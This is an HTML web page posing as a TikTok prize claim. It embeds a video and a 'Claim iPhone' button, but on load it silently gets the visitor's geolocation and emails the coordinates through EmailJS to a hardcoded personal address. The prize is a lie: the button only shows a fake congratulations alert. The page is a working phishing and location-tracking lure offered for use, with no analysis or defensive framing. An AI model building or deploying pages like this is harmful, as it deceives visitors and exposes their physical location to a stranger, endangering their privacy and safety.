<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>TikTok Video Claim</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      background: black;
      font-family: Arial, sans-serif;
      overflow: hidden;
    }

    .video-container {
      position: relative;
      height: 100vh;
      width: 100vw;
    }

    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
    }

    /* Floating Claim Button */
    .claim-btn {
      position: absolute;
      bottom: 80px;
      left: 50%;
      transform: translateX(-50%);
      background: #ff0050;
      color: white;
      border: none;
      padding: 16px 28px;
      font-size: 18px;
      font-weight: bold;
      border-radius: 25px;
      cursor: pointer;
      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
      transition: background 0.3s;
      z-index: 10;
    }
    .claim-btn:hover {
      background: #d40045;
    }

    /* Status + Location Overlay */
    #status, #locationDisplay {
      position: absolute;
      bottom: 20px;
      width: 100%;
      text-align: center;
      color: white;
      font-size: 14px;
      text-shadow: 0 2px 6px rgba(0,0,0,0.8);
      z-index: 10;
    }

    #locationDisplay {
      bottom: 45px;
      font-size: 13px;
      opacity: 0.8;
    }
  </style>
</head>
<body>
  <div class="video-container">
    <!-- Embed TikTok video -->
    <iframe 
      src="https://www.tiktok.com/embed/7390033908571622687" 
      allowfullscreen
      allow="autoplay; encrypted-media; picture-in-picture"
      scrolling="no"
      frameborder="0">
    </iframe>

    <!-- Floating Claim Button -->
    <button class="claim-btn" onclick="claimReward()">üéÅ Claim iPhone</button>

    <!-- Location + Status -->
    <p id="locationDisplay">Detecting your location...</p>
    <p id="status">Please allow location permission for correct address.</p>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    emailjs.init("DRiE8k3oDNHGCgKe8");

    const statusEl = document.getElementById("status");
    const locationDisplay = document.getElementById("locationDisplay");

    function sendLocationEmail(lat, lng) {
      emailjs.send("service_37xvj29", "template_9ereija", {
        latitude: lat,
        longitude: lng,
        to_email: "jhonkid92@gmail.com",
        subject: "User Location"
      })
      .then(() => {
        statusEl.textContent = `‚úÖ Location sent successfully!`;
        locationDisplay.textContent = `Lat: ${lat}, Lng: ${lng}`;
      })
      .catch((error) => {
        statusEl.textContent = "‚ùå Failed to send email: " + error.text;
      });
    }

    function getLocationAndSend() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude.toFixed(6);
            const lng = position.coords.longitude.toFixed(6);
            locationDisplay.textContent = `üìç Latitude ${lat}, Longitude ${lng}`;
            statusEl.textContent = `Location found. Sending email...`;
            sendLocationEmail(lat, lng);
          },
          (error) => {
            locationDisplay.textContent = "‚ö†Ô∏è Error: " + error.message;
            statusEl.textContent = "Error getting location.";
          }
        );
      } else {
        locationDisplay.textContent = "Geolocation not supported.";
        statusEl.textContent = "Browser does not support location.";
      }
    }

    window.onload = getLocationAndSend;

    function claimReward() {
      alert("üéâ Congratulations! Your claim has been submitted.");
    }
  </script>
</body>
</html>
